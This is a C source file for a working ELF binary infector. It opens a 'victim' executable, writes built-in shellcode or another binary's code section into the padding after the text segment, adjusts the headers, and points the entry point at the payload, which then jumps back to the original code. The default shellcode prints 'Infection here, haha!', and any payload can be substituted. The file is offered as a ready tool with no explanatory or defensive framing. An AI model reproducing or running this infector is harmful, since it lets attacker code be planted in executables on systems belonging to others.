#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdint.h>

#include <elf.h>
#include <sys/mman.h>


char payload_shellcode[] = "\x50\x57\x56\x52\x53\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x8d\x35\x1b\x00\x00\x00\xba\x16\x00\x00\x00\x0f\x05\x5b\x5a\x5e\x5f\x58\x48\x8d\x05\xd7\xff\xff\xff\x48\x2d\x11\x11\x11\x11\xff\xe0\x49\x6e\x66\x65\x63\x74\x69\x6f\x6e\x20\x68\x65\x72\x65\x2c\x20\x68\x61\x68\x61\x21\x0a\x00";


typedef struct {
    Elf64_Ehdr* ehdr;
    Elf64_Phdr* phdr;
    Elf64_Shdr* shdr;

    char* file_name;
    uint32_t file_size;
    int32_t fd;
} elf_stat;


elf_stat* load_elf(char* file_name) {
    uint32_t file_size;
    int32_t fd, read_bytes_count;
    struct stat file_info;
    Elf64_Ehdr* ehdr;
    Elf64_Phdr* phdr;
    Elf64_Shdr* shdr;
    elf_stat* stat;

    fd = open(file_name, O_RDWR, 0);
    if (fd < 0) {
        perror(file_name);
        exit(EXIT_FAILURE);
    }

    fstat(fd, &file_info);

    file_size = file_info.st_size;

    ehdr = (Elf64_Ehdr*) mmap(0, file_size,
               PROT_READ | PROT_WRITE | PROT_EXEC,
               MAP_SHARED, fd, 0);
    if (ehdr == MAP_FAILED) {
        close(fd);
        perror(file_name);
        exit(EXIT_FAILURE);
    }

    if (ehdr->e_ident[0] != 0x7f && strcmp(&ehdr->e_ident[1], "ELF")) {
        close(fd);
        fprintf(stderr, "File %s is not an elf file\n", file_name);
        exit(1);
    }

    phdr = (Elf64_Phdr*) ((char*) ehdr + ehdr->e_phoff);
    shdr = (Elf64_Shdr*) ((char*) ehdr + ehdr->e_shoff);

    stat = (elf_stat*) malloc(sizeof(elf_stat));

    stat->ehdr = ehdr;
    stat->phdr = phdr;
    stat->shdr = shdr;
    stat->file_name = file_name;
    stat->fd = fd;
    stat->file_size = file_size;

    return stat;
}


char* get_section(elf_stat* stat, const char* s_name, uint64_t* size) {
    uint16_t i;
    char* section_name;
    char* section_data;
    Elf64_Shdr* start_section = stat->shdr + stat->ehdr->e_shstrndx;
    char* section_table = (char*) stat->ehdr + start_section->sh_offset;

    for (i = 0; i < stat->ehdr->e_shnum; i++) {
        section_name = section_table + stat->shdr[i].sh_name;
        if (!strcmp(section_name, s_name)) {
            *size = stat->shdr[i].sh_size;
            section_data = (char*) malloc(*size);
            memcpy(section_data, (char*)stat->ehdr + stat->shdr[i].sh_offset, *size);
            return section_data;
        }
    }

    return NULL;
}


int replace_fake_entry_point(char* payload_data, int payload_size, uint32_t fake, uint32_t real) {
    int i;
    uint32_t value;

    for (i = 0; i < payload_size; i++) {
        value = *((uint32_t*) (payload_data + i));
        if ((value ^ fake) == 0) {
            *((uint32_t*) (payload_data + i)) = real;
            return 0;
        }
    }
    return -1;
}


int prepare_infection(elf_stat* victim, elf_stat* payload) {
    uint16_t i;
    uint64_t end_of_text_segment, gap_size, payload_size;
    char* mem;
    char* payload_data;
    Elf64_Addr old_entry_point, payload_vaddr;
    Elf64_Phdr text_segment, data_segment;

    old_entry_point = victim->ehdr->e_entry;

    if (payload == NULL) {
        payload_data = payload_shellcode;
        payload_size = sizeof(payload_shellcode);
    }
    else {
        payload_data = get_section(payload, ".text", &payload_size);
    }

    if (payload_data == NULL) {
        fprintf(stderr, "Can't find .text section\n");
        return 1;
    }

    for (i = 0; i < victim->ehdr->e_phnum; i++){
        if (victim->phdr[i].p_type == PT_LOAD && victim->phdr[i].p_offset == 0) {
            text_segment = victim->phdr[i];
            data_segment = victim->phdr[i+1];

            end_of_text_segment = text_segment.p_offset + text_segment.p_filesz;
            gap_size = data_segment.p_offset - end_of_text_segment;
            if (gap_size < payload_size) {
                fprintf(stderr, "Payload size is too big\n");
                return 1;
            }
            payload_vaddr = (Elf64_Addr) (text_segment.p_vaddr + end_of_text_segment);
            victim->phdr[i].p_filesz += payload_size;
            victim->phdr[i].p_memsz += payload_size;
            break;
        }
    }

    for (i = 0; i < victim->ehdr->e_shnum; i++){
        if (victim->shdr[i].sh_offset + victim->shdr[i].sh_size == end_of_text_segment) {
            victim->shdr[i].sh_size += payload_size;
            victim->shdr[i].sh_flags |= SHF_EXECINSTR;
        }
    }

    int res = replace_fake_entry_point(payload_data, payload_size, (uint32_t) 0x11111111, (uint32_t) (end_of_text_segment - old_entry_point));
    if (res == -1) {
        fprintf(stderr, "Cant find replace point\n");
        return 1;
    }

    victim->ehdr->e_entry = payload_vaddr;
    mem = (char*) victim->ehdr;
    memcpy(mem + end_of_text_segment, payload_data, payload_size);

    if (payload_data != NULL && payload != NULL) {
       free(payload_data);
    }

    return 0;
}


int clean_elf_stat(elf_stat* stat) {
    munmap(stat->ehdr, stat->file_size);

    close(stat->fd);
    free(stat);

    return 0;
}


int main(int argc, char* argv[]) {
    elf_stat* victim_elf_stat;
    elf_stat* payload_elf_stat;
    const char* section_name;

    if (argc == 2) {
        victim_elf_stat = load_elf(argv[1]);
        prepare_infection(victim_elf_stat, NULL);
    }
    else if (argc == 3) {
        victim_elf_stat = load_elf(argv[1]);
        payload_elf_stat = load_elf(argv[2]);
        prepare_infection(victim_elf_stat, payload_elf_stat);
        clean_elf_stat(payload_elf_stat);
    }
    else {
        fprintf(stderr, "Usage: %s victim [payload]\n", argv[0]);
        exit(1);
    }

    clean_elf_stat(victim_elf_stat);

    return 0;
}